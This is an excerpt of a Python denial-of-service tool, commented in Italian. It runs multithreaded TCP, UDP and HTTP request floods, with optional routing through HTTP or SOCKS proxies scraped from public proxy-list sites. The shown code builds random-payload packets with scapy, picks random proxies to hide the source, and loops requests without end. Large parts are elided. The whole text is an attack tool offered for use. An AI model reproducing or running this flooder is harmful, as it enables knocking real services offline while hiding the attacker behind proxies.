...
def choicemirror1():
	global urlproxy
	choice5 = input ("Download from: free-proxy-list.net='0' or inforge.net='1' ")
	if choice5 == "0":
...
def choicemirror2():
	global urlproxy
	choice5 = input ("Download from: socks-proxy.net='0' or inforge.net='1' ")
	if choice5 == "0":
...
def proxyget2(): # anche questa funzione scarica proxy pero' da inforge.net
	try:
...
def loop():
	...
	for x in range(threads): # con questa formula diciamo ai threads di attaccare.
		attack(x+1).start() # start() non fa altro che leggere nella classe  threading.Thread cercando la funzione run(self), la quale serve per dare istruzioni ai threads.
...
class attack(threading.Thread): # la classe del multithreading
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		if choice1 == "1": # se si e' scelto tcp flood
			if choice2 == "y": # e si e scelta la modalita' proxying
				...
				self.tcpflood() # se non si e' scelta la proxying mode, usa la funzione tradizionale per il tcp flood
		else: # oppure:
			if choice1 == "2": # se si e' scelto l'UDP flood
				...
				if choice2 == "y": # se abbiamo scelto la modalita' proxying
					...
					elif choice3 == "1": # se abbiamo scelto i socks
	...
	def tcpfloodproxed(self): # funzione per tcp flood con HTTP proxy
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		proxy = random.choice(proxies).strip().split(":") # seleziona un proxy a random
	...
	def tcpfloodsocked(self): # funzione per tcp flood con socks
		data = random._urandom(1024) # data per il pacchetto random
		p = bytes(IP(dst=str(url2))/TCP(sport=RandShort(), dport=int(port))/data) # costruzione pacchetto tcp + data
		proxy = random.choice(proxies).strip().split(":") # scelta proxy random
	...
	def udpflood(self): # funzione per l'udp flood classico non proxed
		data = random._urandom(1024) # data per il pacchetto random
	...
	def requestproxy(self): # funzione dedicata all'invio di richieste tramite proxy
		...
		proxy = random.choice(proxies).strip().split(":") # selezione proxy casuale
		go.wait() # aspetta che i threads siano pronti
		while True: # ciclo infinito
			try:
	...
	def requestsocks(self): # funzione per invio richieste tramite socks
		...
		proxy = random.choice(proxies).strip().split(":") # selezione di proxy causale
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
